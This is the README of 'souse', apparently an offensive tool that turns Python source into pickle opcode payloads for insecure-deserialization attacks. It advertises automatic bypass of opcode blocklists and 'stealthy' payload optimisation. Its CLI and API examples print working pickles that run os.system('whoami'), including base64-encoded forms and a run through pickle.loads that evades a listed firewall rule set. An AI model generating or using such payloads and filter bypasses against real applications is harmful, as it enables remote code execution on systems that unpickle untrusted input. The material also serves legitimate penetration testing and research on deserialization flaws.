# souse
A tool for converting Python source code to opcode(pickle), source code is payload :)

[中文版](./README_CN.md)

try now: `pip3 install --upgrade souse`

## 1. help

<img src="https://raw.githubusercontent.com/Macr0phag3/souse/master/pics/help.png" width="600">

After installing with pip, you can use `souse -h` directly.

## 2. Key Features

- **🚀 Intelligent Reconstruction**: Automatically reconstructs non-pickleable Python source code into fully compatible opcode sequences. For complex source transforms, use [parselmouth](https://github.com/Macr0phag3/parselmouth) before souse.
- **✨ Automated Builtins**: Built-in functions like `open`, `eval`, and `getattr` are recognized automatically—no manual import needed.
- **🛡️ Advanced Bypass**: Auto bypass complex limitations (`R`, `o`, `i`, ...)
- **⚡ Stealthy Optimization**: Automatically optimizes generated opcodes using `pickletools` for minimal size and maximum stealth.
- **📦 Multi-Functional Transfer**: Flexible encoding support (Base64, Hex, URL) and custom transformation sequences.
- **📝 Precise Debugging**: Pinpoints errors with full source code context and syntax highlighting.
- **🔍 Explain View**: Inspect cumulative opcodes, stack effects, and per-opcode meanings through the CLI explain mode.
- **💡 API Support**: Convert Python source code to opcode(pickle) via API.

opcode supported list: [opcode](./opcodes.md)

## 3. usage
### 3.1 CLI
`./souse/cases/` contains example inputs and case-level regression samples for `souse.py`.

#### 3.1.1 case 1
```
» cat souse/cases/call-1.py
from os import system

a = "whoami"
system(a)
# b'cos\nsystem\np0\nVwhoami\np1\ng0\n(g1\ntR.'
```

<img src="https://raw.githubusercontent.com/Macr0phag3/souse/master/pics/case-1.png" width="600">

#### 3.1.2 case 2

Automatically reconstructs non-pickleable Python source code into fully compatible opcode sequences.

```
» cat souse/cases/call-3.py
import os

os.system("whoami")
# b'cos\nsystem\np0\ng0\n(Vwhoami\ntR.'
```

<img src="https://raw.githubusercontent.com/Macr0phag3/souse/master/pics/case-2.png" width="600">

#### 3.1.3 case 3

You can control the final deserialization result by writing a variable name as the last line of the source code:

```py
c=10
a = {}
a["empty"] = ""
c
```

#### 3.1.4 case 4

transfer opcode:

```py
In [1]: import base64, souse

In [2]: exp = "from os import system\nsystem('whoami')"

In [3]: souse.API(exp, optimized=True, transfer=base64.b64encode).generate()
Out[3]: b'Y29zCnN5c3RlbQooVndob2FtaQp0Ui4='
```

supported(You can customize it when calling the API):
- [x] base64_encode
- [x] hex_encode
- [x] url_encode

#### 3.1.5 run tests

Requires `pytest`、`pytest_cov `.

```bash
python souse/souse.py --run-test
```

#### 3.1.6 explain opcodes

Use `--explain` to print the opcode summary and explanation view after generation:

```bash
python souse/souse.py -f souse/cases/call-1.py --explain
```

<img src="https://raw.githubusercontent.com/Macr0phag3/souse/master/pics/explain.png" width="600">

#### 3.1.7 firewall rules

`--bypass` uses comma-separated opcode names:

```bash
python souse/souse.py -f tmp-test.py -p R,o,i
```

You can also pass a rules file whose content is plain text like:

```text
R, o, i, \x81
```

### 3.2 API
example:

```py
In [1]: import souse

In [2]: exp = "from os import system\nsystem('whoami')"

In [3]: souse.API(exp, optimized=True, transfer=pickle.loads).generate()
macr0phag3
Out[3]: 0

In [4]: import base64

In [5]: souse.API(exp, optimized=True, transfer=base64.b64encode).generate()
Out[5]: b'Y29zCnN5c3RlbQooVndob2FtaQp0Ui4='

In [6]: souse.API(exp, optimized=True, transfer=[bytes.decode, str.encode, base64.b64encode]).generate()
Out[6]: b'Y29zCnN5c3RlbQooVndob2FtaQp0Ui4='

In [7]: import pickle

In [8]: firewall_rules = [
    ...:     "V",
    ...:     "I01",
    ...:     "I",
    ...:     "R"
    ...: ]

In [9]: souse.API(exp, optimized=True, transfer=pickle.loads, firewall_rules=firewall_rules).generate()
[*] choice o to bypass rule: ['R'] x1
[*] choice S to bypass rule: ['V'] x1
macr0phag3
Out[9]: 0
```

## 4. TODO
- [x] support for nested expressions
- [x] opcode bypass supported
	- [x] auto bypass basic limitation（`V`、`S`、`I`、...）
	- [x] auto bypass complex limitation（`R`、`o`、`i`）
	- [x] auto bypass `stb` limitation (via `setattr`)
- [x] Intelligent Import Transformation (Lazy Import)
- [x] Intelligent Attribute Assignment Transformation (By `getattr`/`setattr`)
- [x] Converted code output support
- [x] API
- [x] `pip install` supported
- [x] Contextual source error reporting
- [x] Intelligent Subscript Downgrade (`u` -> `__setitem__`)
- [x] Automated Builtin recognition

## ## Others
<img src="https://clean-1252075454.cos.ap-nanjing.myqcloud.com/20200528120800990.png" width="500">

[![Stargazers over time](https://starchart.cc/Macr0phag3/souse.svg)](https://starchart.cc/Macr0phag3/souse)
